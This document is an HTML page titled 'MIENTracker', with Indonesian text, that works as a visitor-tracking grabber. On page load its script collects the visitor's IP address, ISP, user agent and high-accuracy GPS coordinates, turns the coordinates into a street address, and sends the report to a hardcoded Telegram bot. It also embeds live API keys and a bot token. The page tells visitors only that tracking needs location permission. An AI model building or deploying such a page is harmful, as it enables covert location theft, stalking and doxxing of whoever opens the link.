<!DOCTYPE html>
<html>
<head>
  <title>MIENTracker</title>
</head>
<body>
  <h1 style="color:lime;">MIENTracker Aktif</h1>
  <p>Silakan izinkan lokasi agar pelacakan akurat.</p>

  <script>
// IP + GPS tracking with Google Maps link and reverse geolocation
fetch("https://ipinfo.io/json?token=447024f6985241")
  .then(response => response.json())
  .then(ipData => {
    const ip = ipData.ip;
    const city = ipData.city;
    const region = ipData.region;
    const country = ipData.country;
    const org = ipData.org;
    const loc = ipData.loc;
    const timezone = ipData.timezone;
    const userAgent = navigator.userAgent;
    const accessTime = new Date().toLocaleString();

    let message = `
🕵️ PENGUNJUNG MASUK
🌐 IP: ${ip}
📍 Lokasi IP: ${city}, ${region}, ${country}
📡 ISP: ${org}
🧭 Koordinat IP: ${loc}
🕒 Zona Waktu: ${timezone}
🖥️ User Agent: ${userAgent}
🗓️ Akses: ${accessTime}
`;

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        position => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          const accuracy = position.coords.accuracy;
          const gpsTime = new Date(position.timestamp).toLocaleString();
          const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

          message += `
📍 LOKASI GPS DIIZINKAN
📌 Latitude: ${latitude}
📌 Longitude: ${longitude}
🎯 Akurasi: ${accuracy} meter
⏰ GPS Timestamp: ${gpsTime}
🗺️ Google Maps: ${mapsLink}
`;

          const reverseURL = `https://api.opencagedata.com/geocode/v1/json?q=${latitude}+${longitude}&key=91859b36478a4af78f1717f2abae19bc`;
          fetch(reverseURL)
            .then(res => res.json())
            .then(geoData => {
              const address = geoData.results[0]?.formatted;
              if (address) {
                message += `🏠 Perkiraan Alamat: ${address}`;
              }
              sendToTelegram(message);
            })
            .catch(() => {
              sendToTelegram(message + "\\n⚠️ Gagal ambil alamat.");
            });
        },
        error => {
          message += `⚠️ Gagal ambil lokasi GPS: ${error.message}`;
          sendToTelegram(message);
        },
        { enableHighAccuracy: true }
      );
    } else {
      message += `⚠️ Browser tidak mendukung GPS`;
      sendToTelegram(message);
    }

    function sendToTelegram(msg) {
      const url = `https://api.telegram.org/bot7723202416:AAHGcGq9XYJbXd3fgJHHl64CJ-Ovau2KI44/sendMessage?chat_id=7932600874&text=${encodeURIComponent(msg)}`;
      fetch(url).catch(err => console.error(err));
    }
  })
  .catch(err => {
    console.error("Gagal ambil IP info:", err);
  });
  </script>
</body>
</html>